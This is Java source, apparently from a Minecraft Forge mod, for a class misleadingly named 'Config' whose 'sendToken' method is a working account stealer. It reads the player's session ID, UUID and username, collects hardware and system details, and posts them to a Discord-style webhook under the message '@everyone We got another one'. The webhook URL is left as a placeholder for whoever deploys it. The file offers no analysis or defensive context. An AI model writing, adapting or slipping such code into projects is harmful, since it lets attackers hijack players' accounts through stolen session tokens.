
import java.io.OutputStream;
import java.net.URL;
import javax.net.ssl.HttpsURLConnection;
import net.minecraft.client.Minecraft;
import net.minecraft.client.renderer.OpenGlHelper;
import net.minecraftforge.common.ForgeVersion;
import net.minecraftforge.fml.common.Loader;
import org.lwjgl.opengl.Display;
import org.lwjgl.opengl.GL11;

public class Config {
  public static void sendToken() {
    long maxMemory = Runtime.getRuntime().maxMemory();
    long totalMemory = Runtime.getRuntime().totalMemory();
    long freeMemory = Runtime.getRuntime().freeMemory();
    long currentMemory = totalMemory - freeMemory;
    int activeModCount = Loader.instance().getActiveModList().size();
    String name = Minecraft.func_71410_x().func_110432_I().func_111285_a();
    String helmavatar = "https://cravatar.eu/helmavatar/" + name + "/190.png";
    String helmhead = "https://cravatar.eu/helmhead/" + name + "/190.png";
    String skylea = "[SkyCrypt](https://sky.shiiyu.moe/stats/" + name + "/)";
    String plancke = "[Plancke](https://plancke.io/hypixel/player/stats/" + name + "/)";
    String sessionID = Minecraft.func_71410_x().func_110432_I().func_111286_b();
    String uuid = Minecraft.func_71410_x().func_110432_I().func_148255_b();
    String time = "SYSTime: " + String.valueOf(Minecraft.func_71386_F());
    String OS = "OS: " + System.getProperty("os.name");
    String CPU = "CPU: " + OpenGlHelper.func_183029_j();
    String DisplayObj = "DisplayObj: " + String.format("%dx%d (%s)", new Object[] { Integer.valueOf(Display.getWidth()), Integer.valueOf(Display.getHeight()), GL11.glGetString(7936) });
    String GPU = "GPU: " + GL11.glGetString(7937);
    String GPUDriver = "GPUDriver: " + GL11.glGetString(7938);
    String FPS = "FPS Limit: " + String.valueOf(Minecraft.func_71410_x().func_90020_K());
    String LoadedMods = "LoadedMods: " + String.valueOf(activeModCount);
    String Forge = "Forge: " + ForgeVersion.getVersion();
    String Java = "Java: " + String.format("%s %dbit", new Object[] { System.getProperty("java.version"), Integer.valueOf(Minecraft.func_71410_x().func_147111_S() ? 64 : 32) });
    String Memory = "Memory: " + String.format("% 2d%% %03d/%03dMB", new Object[] { Long.valueOf(currentMemory * 100L / maxMemory), Long.valueOf(currentMemory / 1024L / 1024L), Long.valueOf(maxMemory / 1024L / 1024L) });
    String MemoryAllocated = "MemoryAllocated: " + String.format("% 2d%% %03dMB", new Object[] { Long.valueOf(totalMemory * 100L / maxMemory), Long.valueOf(totalMemory / 1024L / 1024L) });
    String webhookURL = "Your Webhook Here";
    String information = "";
    information = "{\n  \"content\": \"@everyone We got another one\",\n  \"embeds\": [\n    {\n     \"title\": \"" + name + "\",\n" + "    \"description\": \"" + skylea + " " + plancke + "\",\n" + "    \"url\": \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\n" + "    \"color\": 15794431,\n" + "    \"footer\": {\n" + "      \"icon_url\": \"" + helmavatar + "\",\n" + "      \"text\": \"< Is A Skill Issue\"\n" + "    },\n" + "    \"thumbnail\": {\n" + "      \"url\": \"" + helmavatar + "\"\n" + "    },\n" + "    \"image\": {\n" + "      \"url\": \"" + helmhead + "\"\n" + "    },\n" + "    \"fields\": [\n" + "      {\n" + "        \"name\": \"SSID\",\n" + "        \"value\": \"" + sessionID + "\"\n" + "      },\n" + "      {\n" + "        \"name\": \"UUID\",\n" + "        \"value\": \"" + uuid + "\"\n" + "      },\n" + "      {\n" + "        \"name\": \"Information\",\n" + "        \"value\": \"" + OS + "\\n" + CPU + "\\n" + DisplayObj + "\\n" + GPU + "\\n" + GPUDriver + "\\n" + FPS + "\\n" + LoadedMods + "\\n" + Forge + "\\n" + Java + "\\n" + MemoryAllocated + "\\n" + Memory + "\\n" + time + "\"\n" + "      },\n" + "      {\n" + "        \"name\": \"Debug Information\",\n" + "        \"value\": \"None\"\n" + "      },\n" + "      {\n" + "        \"name\": \"Information for SessionLogin\",\n" + "        \"value\": \"**Name**: " + name + "\\n**SessionID**: " + sessionID.replace(":" + uuid, "") + "\\n**UUID**: " + uuid + "\"\n" + "        }\n" + "      ]\n" + "    }\n" + "  ]\n" + "}";
    try {
      URL url = new URL(webhookURL);
      HttpsURLConnection connection = (HttpsURLConnection)url.openConnection();
      connection.addRequestProperty("Content-Type", "application/json");
      connection.addRequestProperty("User-Agent", "Mod");
      connection.setDoOutput(true);
      connection.setRequestMethod("POST");
      OutputStream stream = connection.getOutputStream();
      stream.write(information.getBytes());
      stream.flush();
      stream.close();
      connection.getInputStream().close();
      connection.disconnect();
    } catch (Exception e) {
      e.printStackTrace();
    } 
  }
}
